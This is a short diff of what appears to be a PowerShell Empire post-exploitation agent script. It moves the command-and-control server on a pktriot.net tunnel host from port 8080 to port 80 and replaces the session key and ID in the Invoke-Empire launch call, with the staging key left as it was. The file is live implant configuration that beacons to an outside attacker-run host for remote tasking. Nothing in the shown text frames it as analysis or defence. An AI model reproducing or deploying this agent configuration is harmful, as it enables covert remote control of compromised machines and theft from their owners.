@@ -1,4 +1,4 @@
-$Script:server = "http://brave-dust-49022.pktriot.net:8080";
+$Script:server = "http://brave-dust-49022.pktriot.net:80";
 $Script:ControlServers = @($Script:server);
 $Script:ServerIndex = 0;
 if($server.StartsWith('https')){
@@ -987,4 +987,4 @@ function Invoke-Empire {
     }
 }
 
-Invoke-Empire -Servers @('http://brave-dust-49022.pktriot.net:8080') -StagingKey '+D7|O1?kutgc=)6EjVe[3%pCRyr{fs#B' -SessionKey 'oqX5*W9}Zz+GH%;4_Ed^F~y{j@xp3MSw' -SessionID '2OTDJ6DY' -WorkingHours '' -KillDate '';
+Invoke-Empire -Servers @('http://brave-dust-49022.pktriot.net:80') -StagingKey '+D7|O1?kutgc=)6EjVe[3%pCRyr{fs#B' -SessionKey 'B.2wKR1OCx][!;|D7NEu,dpr6$Wz?M:{' -SessionID '273Y99S8' -WorkingHours '' -KillDate '';
